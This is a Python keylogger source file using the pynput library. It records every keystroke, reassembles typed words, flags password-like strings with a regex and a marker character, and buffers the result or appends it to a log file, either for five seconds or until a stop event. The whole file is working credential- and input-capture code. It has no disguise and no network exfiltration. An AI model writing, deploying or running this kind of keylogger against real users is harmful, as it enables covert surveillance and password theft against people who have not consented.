from pynput import keyboard
import datetime
import re
import time
from functools import partial
import threading
import os

def check_pass(password) -> bool:
    pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
    match = re.match(pattern, password)
    return bool(match)

word = ""
buffer_words = []
stop_event = threading.Event()

global FILE_PATH_LOG
def get_path(path):
    FILE_PATH_LOG = path


def keyPressed(key, file_path):
    global word
    
    #file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
    
    with open(file_path,'a') as log_file:
        try:
            if hasattr(key, 'char'):  # Regular character
                word += key.char

            elif key == keyboard.Key.space:  # Space key
                buffer_words.append(word)  # Add the current word to the buffer
                word = ""  # Reset the word

            elif key == keyboard.Key.enter:  # Enter key
                if check_pass(word):
                    word = "¿" + word  # Mark password-like words
                buffer_words.append(word)
                word = ""  # Reset the word

            elif key == keyboard.Key.backspace:  # Backspace key
                # Remove the last character from the current word, if any
                word = word[:-1]

            elif key == keyboard.Key.delete:  # Delete key
                # Optional: Handle delete key, e.g., log a delete event
                buffer_words.append("[DELETE]")

            elif key in (keyboard.Key.alt, keyboard.Key.tab):  # Alt or Tab keys
                buffer_words.append(f"[{key.name.upper()}]")  # Log the special key press

            elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):  # Modifier keys
                # Optionally log modifier key presses
                buffer_words.append(f"[{key.name.upper()}]")

            else:
                # Log any unhandled special key presses
                buffer_words.append(f"[{key}]")

        except Exception as e:
            print("Error:", e)

def keyPressedF(key, file_path):
    global word
    
    #file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
    
    with open(file_path,'a') as log_file:
        try:
            if hasattr(key, 'char'):  # Regular character
                word += key.char

            elif key == keyboard.Key.space:  # Space key
                log_file.write(word + " ")  # Add the current word to the buffer
                word = ""  # Reset the word

            elif key == keyboard.Key.enter:  # Enter key
                if check_pass(word):
                    word = "¿" + word  # Mark password-like words
                log_file.write(word)
                word = ""  # Reset the word

            elif key == keyboard.Key.backspace:  # Backspace key
                # Remove the last character from the current word, if any
                word = word[:-1]

            elif key == keyboard.Key.delete:  # Delete key
                # Optional: Handle delete key, e.g., log a delete event
                log_file.write("[DELETE]")

            elif key in (keyboard.Key.alt, keyboard.Key.tab):  # Alt or Tab keys
                log_file.write(f"[{key.name.upper()}]")  # Log the special key press

            elif key in (keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):  # Modifier keys
                # Optionally log modifier key presses
                log_file.write(f"[{key.name.upper()}]")

            else:
                # Log any unhandled special key presses
                log_file.write(f"[{key}]")

        except Exception as e:
            print("Error:", e)
'''
file_path = "C:/Users/imclp/OneDrive/Desktop/projects/kyg/log.txt"
keyPressed_with_path = partial(keyPressed, file_path=file_path)

listner = keyboard.Listener(on_press = keyPressed_with_path)
listner.start()
time.sleep(5)
listner.stop()
print(buffer_words)
'''

def keyboard_logger_pathed(path):
    keyPressed_with_path = partial(keyPressed, file_path=path)

    listner = keyboard.Listener(on_press = keyPressed_with_path)
    listner.start()
    time.sleep(5)
    listner.stop()
    return buffer_words
    #print(buffer_words)

def keyboard_logger_pathed_without_timer(path):
    keyPressed_with_path = partial(keyPressed, file_path=path)

    listner = keyboard.Listener(on_press = keyPressed_with_path)
    listner.start()
    #time.sleep(5)

    try:
        while not stop_event.is_set():
            threading.Event().wait(0.1)
    finally:
        listner.stop()
        print('keylogger has stopped')
    
    #listner.stop()
    return buffer_words
    #print(buffer_words)


'''
#sample
listner = keyboard.Listener(on_press = keyPressed)
listner.start()
time.sleep(5)
listner.stop()
print(buffer_words)

'''
